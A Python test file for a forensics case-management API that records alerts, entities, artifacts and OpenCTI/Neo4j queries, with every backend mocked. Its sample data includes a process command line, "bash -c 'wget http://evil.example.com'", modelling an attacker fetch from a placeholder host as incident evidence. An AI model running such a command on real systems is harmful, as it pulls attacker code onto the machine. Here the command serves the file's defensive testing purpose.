#!/usr/bin/env python3
"""Integration tests for Layer 2: Case Management & Evidence API.

All Neo4j and MinIO calls are mocked — no external services are required.
The tests use FastAPI's TestClient against the router produced by
``forensics.api.create_forensics_router``.
"""

from __future__ import annotations

import io
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# Path setup — allow importing phase4 package directly (no install needed)
# ---------------------------------------------------------------------------
PHASE4_ROOT = Path(__file__).resolve().parents[2] / "src" / "wazuh_mcp_server" / "phase4"
sys.path.insert(0, str(PHASE4_ROOT))

from forensics.api import create_forensics_router  # noqa: E402


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_graph():
    """Return a MagicMock that mimics ForensicGraph's public interface."""
    g = MagicMock()
    g.ping.return_value = True
    g.merge_alert.return_value = {"alert_id": "ALT-001", "incident_id": "INC-001"}
    g.merge_ip.return_value = {"ip": "1.2.3.4"}
    g.merge_user.return_value = {"username": "attacker"}
    g.merge_domain.return_value = {"name": "evil.example.com"}
    g.merge_workstation.return_value = {"hostname": "srv-01"}
    g.merge_process.return_value = {"pid_host": "srv-01:1234"}
    g.merge_file.return_value = {"path": "/tmp/malware.sh"}
    g.link_alert_ip.return_value = None
    g.link_alert_user.return_value = None
    g.link_alert_file.return_value = None
    g.create_relationship.return_value = True
    g.get_incident_timeline.return_value = [
        {"alert": {"alert_id": "ALT-001", "timestamp": "2026-04-21T12:00:00Z"}, "links": []}
    ]
    g.get_incident_graph.return_value = {
        "nodes": [{"id": "n1", "labels": ["ALERT"], "props": {"alert_id": "ALT-001"}}],
        "edges": [],
    }
    g.find_incidents_by_ip.return_value = ["INC-001", "INC-002"]
    g.find_incidents_by_domain.return_value = ["INC-003"]
    g.find_incidents_by_user.return_value = ["INC-001"]
    g.detect_lateral_movement.return_value = [
        {"user": "bob", "workstations": ["ws-01", "ws-02"], "login_count": 2}
    ]
    g.get_attack_chain.return_value = [
        {"chain": [{"labels": ["IP_ADDRESS"], "props": {"ip": "1.2.3.4"}}], "rel_types": [], "depth": 0}
    ]
    return g


def _make_store():
    """Return a MagicMock that mimics ArtifactStore's public interface."""
    s = MagicMock()
    s.ping.return_value = True
    s.upload.return_value = {
        "artifact_id":  "art-uuid-001",
        "object_name":  "INC-001/art-uuid-001/auth.log",
        "filename":     "auth.log",
        "size_bytes":   512,
        "content_type": "text/plain",
        "incident_id":  "INC-001",
        "bucket":       "forensic-evidence",
    }
    s.list_artifacts.return_value = [
        {
            "artifact_id":   "art-uuid-001",
            "object_name":   "INC-001/art-uuid-001/auth.log",
            "filename":      "auth.log",
            "size_bytes":    512,
            "last_modified": "2026-04-21T12:00:00Z",
            "incident_id":   "INC-001",
            "bucket":        "forensic-evidence",
        }
    ]
    s.delete.return_value = None
    s.get_download_url.return_value = "https://minio.local/presigned/auth.log?token=ABC"
    return s


@pytest.fixture()
def client_with_backends():
    """TestClient wired up with both mock graph and mock store."""
    app = FastAPI()
    app.include_router(create_forensics_router(_make_graph(), _make_store()))
    return TestClient(app)


@pytest.fixture()
def client_no_backends():
    """TestClient with graph=None and store=None (simulates unavailable services)."""
    app = FastAPI()
    app.include_router(create_forensics_router(None, None))
    return TestClient(app)


@pytest.fixture()
def client_graph_only():
    """TestClient with graph available but store=None."""
    app = FastAPI()
    app.include_router(create_forensics_router(_make_graph(), None))
    return TestClient(app)


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

class TestHealth:
    def test_health_both_available(self, client_with_backends):
        r = client_with_backends.get("/cases/health")
        assert r.status_code == 200
        body = r.json()
        assert body["neo4j"]["available"] is True
        assert body["neo4j"]["connected"] is True
        assert body["minio"]["available"] is True
        assert body["minio"]["connected"] is True

    def test_health_both_unavailable(self, client_no_backends):
        r = client_no_backends.get("/cases/health")
        assert r.status_code == 200
        body = r.json()
        assert body["neo4j"]["available"] is False
        assert body["neo4j"]["connected"] is False
        assert body["minio"]["available"] is False
        assert body["minio"]["connected"] is False

    def test_health_graph_only(self, client_graph_only):
        r = client_graph_only.get("/cases/health")
        body = r.json()
        assert body["neo4j"]["available"] is True
        assert body["minio"]["available"] is False


# ---------------------------------------------------------------------------
# POST /cases/alerts
# ---------------------------------------------------------------------------

class TestIngestAlert:
    def test_missing_alert_id_returns_422(self, client_with_backends):
        r = client_with_backends.post("/cases/alerts", json={"incident_id": "INC-001"})
        assert r.status_code == 422

    def test_missing_incident_id_returns_422(self, client_with_backends):
        r = client_with_backends.post("/cases/alerts", json={"alert_id": "ALT-001"})
        assert r.status_code == 422

    def test_ingest_minimal_success(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/alerts",
            json={"alert_id": "ALT-001", "incident_id": "INC-001"},
        )
        assert r.status_code == 201
        body = r.json()
        assert body["status"] == "ok"
        assert "node" in body
        assert isinstance(body["links_created"], list)

    def test_ingest_with_src_ip_creates_ip_link(self, client_with_backends):
        graph = _make_graph()
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.post(
            "/cases/alerts",
            json={"alert_id": "ALT-002", "incident_id": "INC-001", "src_ip": "10.0.0.1"},
        )
        assert r.status_code == 201
        graph.merge_ip.assert_called_with("10.0.0.1")
        graph.link_alert_ip.assert_called_with("ALT-002", "10.0.0.1", role="src")

    def test_ingest_with_dest_ip_creates_dst_link(self, client_with_backends):
        graph = _make_graph()
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.post(
            "/cases/alerts",
            json={"alert_id": "ALT-003", "incident_id": "INC-001", "dest_ip": "192.168.1.50"},
        )
        assert r.status_code == 201
        graph.link_alert_ip.assert_called_with("ALT-003", "192.168.1.50", role="dst")

    def test_ingest_with_username_creates_user_link(self, client_with_backends):
        graph = _make_graph()
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.post(
            "/cases/alerts",
            json={"alert_id": "ALT-004", "incident_id": "INC-001", "username": "bob"},
        )
        assert r.status_code == 201
        graph.merge_user.assert_called_with("bob")
        graph.link_alert_user.assert_called_with("ALT-004", "bob")

    def test_ingest_all_optional_fields(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/alerts",
            json={
                "alert_id":    "ALT-005",
                "incident_id": "INC-001",
                "rule_id":     100054,
                "rule_name":   "SSH brute-force",
                "severity":    9,
                "timestamp":   "2026-04-21T12:00:00Z",
                "full_log":    "sshd[1234]: Failed password for root",
                "src_ip":      "198.51.100.1",
                "dest_ip":     "10.0.0.5",
                "username":    "root",
            },
        )
        assert r.status_code == 201
        links = r.json()["links_created"]
        assert len(links) == 3  # src_ip, dest_ip, username

    def test_graph_unavailable_returns_503(self, client_no_backends):
        r = client_no_backends.post(
            "/cases/alerts",
            json={"alert_id": "ALT-001", "incident_id": "INC-001"},
        )
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# POST /cases/entities
# ---------------------------------------------------------------------------

class TestCreateEntity:
    def test_unknown_node_type_returns_422(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "UNICORN", "ip": "1.2.3.4"},
        )
        assert r.status_code == 422

    def test_ip_address_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "IP_ADDRESS", "ip": "1.2.3.4", "geo": "US"},
        )
        assert r.status_code == 201
        assert r.json()["node_type"] == "IP_ADDRESS"

    def test_domain_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "DOMAIN", "name": "evil.example.com"},
        )
        assert r.status_code == 201

    def test_user_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "USER", "username": "attacker"},
        )
        assert r.status_code == 201

    def test_workstation_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "WORKSTATION", "hostname": "srv-01"},
        )
        assert r.status_code == 201

    def test_process_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={
                "node_type": "PROCESS",
                "pid_host":  "srv-01:9999",
                "name":      "bash",
                "cmdline":   "bash -c 'wget http://evil.example.com'",
            },
        )
        assert r.status_code == 201

    def test_file_entity(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "FILE", "path": "/tmp/dropper.sh"},
        )
        assert r.status_code == 201

    def test_ip_missing_required_key_returns_422(self, client_with_backends):
        # IP_ADDRESS requires "ip" field
        r = client_with_backends.post(
            "/cases/entities",
            json={"node_type": "IP_ADDRESS"},
        )
        assert r.status_code == 422

    def test_graph_unavailable_returns_503(self, client_no_backends):
        r = client_no_backends.post(
            "/cases/entities",
            json={"node_type": "IP_ADDRESS", "ip": "1.2.3.4"},
        )
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# POST /cases/relationships
# ---------------------------------------------------------------------------

class TestCreateRelationship:
    _valid_body = {
        "from_label":  "IP_ADDRESS",
        "from_key":    "ip",
        "from_value":  "1.2.3.4",
        "to_label":    "DOMAIN",
        "to_key":      "name",
        "to_value":    "evil.example.com",
        "rel_type":    "RESOLVES_TO",
    }

    def test_success(self, client_with_backends):
        r = client_with_backends.post("/cases/relationships", json=self._valid_body)
        assert r.status_code == 201
        assert r.json()["relationship"] == "RESOLVES_TO"

    def test_missing_rel_type_returns_422(self, client_with_backends):
        body = {k: v for k, v in self._valid_body.items() if k != "rel_type"}
        r = client_with_backends.post("/cases/relationships", json=body)
        assert r.status_code == 422

    def test_missing_from_label_returns_422(self, client_with_backends):
        body = {k: v for k, v in self._valid_body.items() if k != "from_label"}
        r = client_with_backends.post("/cases/relationships", json=body)
        assert r.status_code == 422

    def test_nodes_not_found_returns_404(self, client_with_backends):
        graph = _make_graph()
        graph.create_relationship.return_value = False
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.post("/cases/relationships", json=self._valid_body)
        assert r.status_code == 404

    def test_graph_unavailable_returns_503(self, client_no_backends):
        r = client_no_backends.post("/cases/relationships", json=self._valid_body)
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# GET /cases/{incident_id}/timeline
# ---------------------------------------------------------------------------

class TestTimeline:
    def test_returns_events(self, client_with_backends):
        r = client_with_backends.get("/cases/INC-001/timeline")
        assert r.status_code == 200
        body = r.json()
        assert body["incident_id"] == "INC-001"
        assert body["count"] == 1
        assert len(body["events"]) == 1

    def test_graph_unavailable_returns_503(self, client_no_backends):
        r = client_no_backends.get("/cases/INC-001/timeline")
        assert r.status_code == 503

    def test_graph_error_returns_500(self):
        graph = _make_graph()
        graph.get_incident_timeline.side_effect = RuntimeError("Neo4j boom")
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app, raise_server_exceptions=False)
        r = c.get("/cases/INC-001/timeline")
        assert r.status_code == 500


# ---------------------------------------------------------------------------
# GET /cases/{incident_id}/graph
# ---------------------------------------------------------------------------

class TestIncidentGraph:
    def test_returns_nodes_and_edges(self, client_with_backends):
        r = client_with_backends.get("/cases/INC-001/graph")
        assert r.status_code == 200
        body = r.json()
        assert body["incident_id"] == "INC-001"
        assert body["node_count"] == 1
        assert body["edge_count"] == 0

    def test_graph_unavailable_returns_503(self, client_no_backends):
        r = client_no_backends.get("/cases/INC-001/graph")
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# GET /cases/query/*
# ---------------------------------------------------------------------------

class TestQueryEndpoints:
    def test_by_ip(self, client_with_backends):
        r = client_with_backends.get("/cases/query/by-ip/1.2.3.4")
        assert r.status_code == 200
        body = r.json()
        assert body["ip"] == "1.2.3.4"
        assert body["count"] == 2
        assert "INC-001" in body["incident_ids"]

    def test_by_domain(self, client_with_backends):
        r = client_with_backends.get("/cases/query/by-domain/evil.example.com")
        assert r.status_code == 200
        body = r.json()
        assert body["domain"] == "evil.example.com"
        assert body["count"] == 1

    def test_by_user(self, client_with_backends):
        r = client_with_backends.get("/cases/query/by-user/bob")
        assert r.status_code == 200
        body = r.json()
        assert body["username"] == "bob"
        assert body["count"] == 1

    def test_lateral_movement_default(self, client_with_backends):
        r = client_with_backends.get("/cases/query/lateral-movement")
        assert r.status_code == 200
        body = r.json()
        assert body["count"] == 1
        assert body["candidates"][0]["user"] == "bob"

    def test_lateral_movement_min_workstations_param_forwarded(self):
        graph = _make_graph()
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.get("/cases/query/lateral-movement?min_workstations=3")
        assert r.status_code == 200
        graph.detect_lateral_movement.assert_called_with(3)

    def test_attack_chain(self, client_with_backends):
        r = client_with_backends.get("/cases/query/attack-chain/1.2.3.4")
        assert r.status_code == 200
        body = r.json()
        assert body["source_ip"] == "1.2.3.4"
        assert body["path_count"] == 1

    def test_attack_chain_max_hops_param_forwarded(self):
        graph = _make_graph()
        app = FastAPI()
        app.include_router(create_forensics_router(graph, _make_store()))
        c = TestClient(app)
        r = c.get("/cases/query/attack-chain/1.2.3.4?max_hops=7")
        assert r.status_code == 200
        graph.get_attack_chain.assert_called_with("1.2.3.4", 7)

    def test_all_query_endpoints_return_503_when_no_graph(self, client_no_backends):
        endpoints = [
            "/cases/query/by-ip/1.2.3.4",
            "/cases/query/by-domain/evil.example.com",
            "/cases/query/by-user/bob",
            "/cases/query/lateral-movement",
            "/cases/query/attack-chain/1.2.3.4",
        ]
        for ep in endpoints:
            r = client_no_backends.get(ep)
            assert r.status_code == 503, f"{ep} should be 503, got {r.status_code}"


# ---------------------------------------------------------------------------
# POST /cases/{incident_id}/artifacts  (upload)
# ---------------------------------------------------------------------------

class TestArtifactUpload:
    def test_upload_success(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/INC-001/artifacts",
            files={"file": ("auth.log", b"Jan 21 failed password for root", "text/plain")},
        )
        assert r.status_code == 201
        body = r.json()
        assert body["status"] == "uploaded"
        assert body["artifact_id"] == "art-uuid-001"
        assert body["filename"] == "auth.log"

    def test_upload_empty_file_returns_422(self, client_with_backends):
        r = client_with_backends.post(
            "/cases/INC-001/artifacts",
            files={"file": ("empty.log", b"", "text/plain")},
        )
        assert r.status_code == 422

    def test_upload_with_description(self, client_with_backends):
        store = _make_store()
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), store))
        c = TestClient(app)
        r = c.post(
            "/cases/INC-001/artifacts",
            files={"file": ("pcap.bin", b"\x00\x01\x02", "application/octet-stream")},
            data={"description": "Network capture for INC-001"},
        )
        assert r.status_code == 201
        # metadata dict should have been passed with x-description
        call_kwargs = store.upload.call_args[1]
        assert call_kwargs.get("metadata") is not None
        assert "x-description" in call_kwargs["metadata"]

    def test_store_unavailable_returns_503(self, client_graph_only):
        r = client_graph_only.post(
            "/cases/INC-001/artifacts",
            files={"file": ("x.log", b"data", "text/plain")},
        )
        assert r.status_code == 503

    def test_store_error_returns_500(self):
        store = _make_store()
        store.upload.side_effect = Exception("MinIO down")
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), store))
        c = TestClient(app, raise_server_exceptions=False)
        r = c.post(
            "/cases/INC-001/artifacts",
            files={"file": ("x.log", b"data", "text/plain")},
        )
        assert r.status_code == 500


# ---------------------------------------------------------------------------
# GET /cases/{incident_id}/artifacts  (list)
# ---------------------------------------------------------------------------

class TestArtifactList:
    def test_list_returns_artifacts(self, client_with_backends):
        r = client_with_backends.get("/cases/INC-001/artifacts")
        assert r.status_code == 200
        body = r.json()
        assert body["incident_id"] == "INC-001"
        assert body["count"] == 1
        assert body["artifacts"][0]["filename"] == "auth.log"

    def test_store_unavailable_returns_503(self, client_graph_only):
        r = client_graph_only.get("/cases/INC-001/artifacts")
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# GET /cases/{incident_id}/artifacts/{id}/download-url
# ---------------------------------------------------------------------------

class TestArtifactDownloadUrl:
    _obj = "INC-001/art-uuid-001/auth.log"

    def test_download_url_returned(self, client_with_backends):
        r = client_with_backends.get(
            f"/cases/INC-001/artifacts/art-uuid-001/download-url"
            f"?object_name={self._obj}"
        )
        assert r.status_code == 200
        body = r.json()
        assert "url" in body
        assert body["artifact_id"] == "art-uuid-001"
        assert body["expires_in"] == 3600

    def test_custom_expires_forwarded(self):
        store = _make_store()
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), store))
        c = TestClient(app)
        r = c.get(
            f"/cases/INC-001/artifacts/art-uuid-001/download-url"
            f"?object_name={self._obj}&expires=7200"
        )
        assert r.status_code == 200
        store.get_download_url.assert_called_with(self._obj, expires_seconds=7200)

    def test_store_unavailable_returns_503(self, client_graph_only):
        r = client_graph_only.get(
            f"/cases/INC-001/artifacts/art-uuid-001/download-url"
            f"?object_name={self._obj}"
        )
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# DELETE /cases/{incident_id}/artifacts/{id}
# ---------------------------------------------------------------------------

class TestArtifactDelete:
    _obj = "INC-001/art-uuid-001/auth.log"

    def test_delete_success(self, client_with_backends):
        r = client_with_backends.delete(
            f"/cases/INC-001/artifacts/art-uuid-001?object_name={self._obj}"
        )
        assert r.status_code == 200
        body = r.json()
        assert body["status"] == "deleted"
        assert body["artifact_id"] == "art-uuid-001"

    def test_missing_object_name_returns_422(self, client_with_backends):
        r = client_with_backends.delete("/cases/INC-001/artifacts/art-uuid-001")
        assert r.status_code == 422

    def test_store_error_returns_500(self):
        store = _make_store()
        store.delete.side_effect = Exception("MinIO error")
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), store))
        c = TestClient(app, raise_server_exceptions=False)
        r = c.delete(
            f"/cases/INC-001/artifacts/art-uuid-001?object_name={self._obj}"
        )
        assert r.status_code == 500

    def test_store_unavailable_returns_503(self, client_graph_only):
        r = client_graph_only.delete(
            f"/cases/INC-001/artifacts/art-uuid-001?object_name={self._obj}"
        )
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# Reverse-flow read endpoints (OpenCTI + Neo4j)
# ---------------------------------------------------------------------------

class TestReverseFlowReadEndpoints:
    @patch.dict("os.environ", {"OPENCTI_URL": "http://opencti-platform:4000", "OPENCTI_API_TOKEN": "tok"}, clear=False)
    @patch("forensics.opencti_client.OpenCTIClient")
    def test_opencti_query_indicators(self, mock_client_cls):
        mock_client = mock_client_cls.return_value
        mock_client.search_observables.return_value = {"count": 1, "observables": [{"observable_value": "1.2.3.4"}]}

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/opencti/query-indicators?value=1.2.3.4&limit=5")
        assert r.status_code == 200
        body = r.json()
        assert body["count"] == 1
        mock_client.search_observables.assert_called_with(value="1.2.3.4", limit=5)

    @patch.dict("os.environ", {"OPENCTI_URL": "http://opencti-platform:4000", "OPENCTI_API_TOKEN": "tok"}, clear=False)
    @patch("forensics.opencti_client.OpenCTIClient")
    def test_opencti_get_observable(self, mock_client_cls):
        mock_client = mock_client_cls.return_value
        mock_client.get_observable.return_value = {"observable_value": "example.org", "entity_type": "Domain-Name"}

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/opencti/observable?value=example.org")
        assert r.status_code == 200
        assert r.json()["observable_value"] == "example.org"
        mock_client.get_observable.assert_called_with(value="example.org")

    @patch.dict("os.environ", {"OPENCTI_URL": "http://opencti-platform:4000", "OPENCTI_API_TOKEN": "tok"}, clear=False)
    @patch("forensics.opencti_client.OpenCTIClient")
    def test_opencti_get_incident(self, mock_client_cls):
        mock_client = mock_client_cls.return_value
        mock_client.get_incident.return_value = {"id": "incident--abc", "name": "INC-FORENSIC-001"}

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/opencti/incident/incident--abc")
        assert r.status_code == 200
        assert r.json()["id"] == "incident--abc"
        mock_client.get_incident.assert_called_with(stix_id="incident--abc")

    @patch.dict("os.environ", {"OPENCTI_URL": "http://opencti-platform:4000", "OPENCTI_API_TOKEN": "tok"}, clear=False)
    @patch("forensics.opencti_client.OpenCTIClient")
    def test_opencti_list_cases(self, mock_client_cls):
        mock_client = mock_client_cls.return_value
        mock_client.list_cases.return_value = {"cases": [{"id": "case--1"}], "count": 1}

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/opencti/cases?hours=12&min_confidence=10&limit=7")
        assert r.status_code == 200
        assert r.json()["count"] == 1
        mock_client.list_cases.assert_called_with(hours=12, min_confidence=10, limit=7)

    @patch.dict("os.environ", {}, clear=True)
    def test_opencti_missing_url_returns_503(self):
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/opencti/query-indicators?value=1.2.3.4")
        assert r.status_code == 503

    @patch("forensics.neo4j_read._default_client")
    def test_neo4j_attack_chain(self, mock_default_client):
        mock_client = mock_default_client.return_value
        mock_client.attack_chain.return_value = [{"depth": 1, "chain": [], "rels": []}]

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/neo4j/attack-chain?ip=1.2.3.4&max_hops=3")
        assert r.status_code == 200
        body = r.json()
        assert body["path_count"] == 1
        mock_client.attack_chain.assert_called_with(ip="1.2.3.4", alert_id="", max_hops=3)

    @patch("forensics.neo4j_read._default_client")
    def test_neo4j_lateral_movement(self, mock_default_client):
        mock_client = mock_default_client.return_value
        mock_client.lateral_movement.return_value = [{"username": "alice", "cnt": 2, "machines": ["ws-01", "ws-02"]}]

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/neo4j/lateral-movement?hours=6&min_machines=2")
        assert r.status_code == 200
        assert r.json()["count"] == 1
        mock_client.lateral_movement.assert_called_with(hours=6, min_machines=2)

    @patch("forensics.neo4j_read._default_client")
    def test_neo4j_ip_context(self, mock_default_client):
        mock_client = mock_default_client.return_value
        mock_client.ip_context.return_value = {"ip": "1.2.3.4", "alerts": [], "related_entities": []}

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.get("/cases/neo4j/ip-context/1.2.3.4")
        assert r.status_code == 200
        assert r.json()["ip"] == "1.2.3.4"
        mock_client.ip_context.assert_called_with(ip="1.2.3.4")

    @patch("forensics.neo4j_read._default_client")
    def test_neo4j_query_success(self, mock_default_client):
        mock_client = mock_default_client.return_value
        mock_client.run_read_query.return_value = [{"ok": 1}]

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.post("/cases/neo4j/query", json={"cypher": "RETURN 1 AS ok", "params": {}})
        assert r.status_code == 200
        assert r.json()["count"] == 1
        mock_client.run_read_query.assert_called_with(cypher="RETURN 1 AS ok", params={})

    def test_neo4j_query_requires_cypher(self):
        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.post("/cases/neo4j/query", json={"params": {}})
        assert r.status_code == 422

    @patch("forensics.neo4j_read._default_client")
    def test_neo4j_query_write_block_returns_422(self, mock_default_client):
        mock_client = mock_default_client.return_value
        mock_client.run_read_query.side_effect = ValueError("Write operations are not allowed in neo4j_query")

        app = FastAPI()
        app.include_router(create_forensics_router(_make_graph(), _make_store()))
        c = TestClient(app)

        r = c.post("/cases/neo4j/query", json={"cypher": "MERGE (n:X {id:1}) RETURN n", "params": {}})
        assert r.status_code == 422
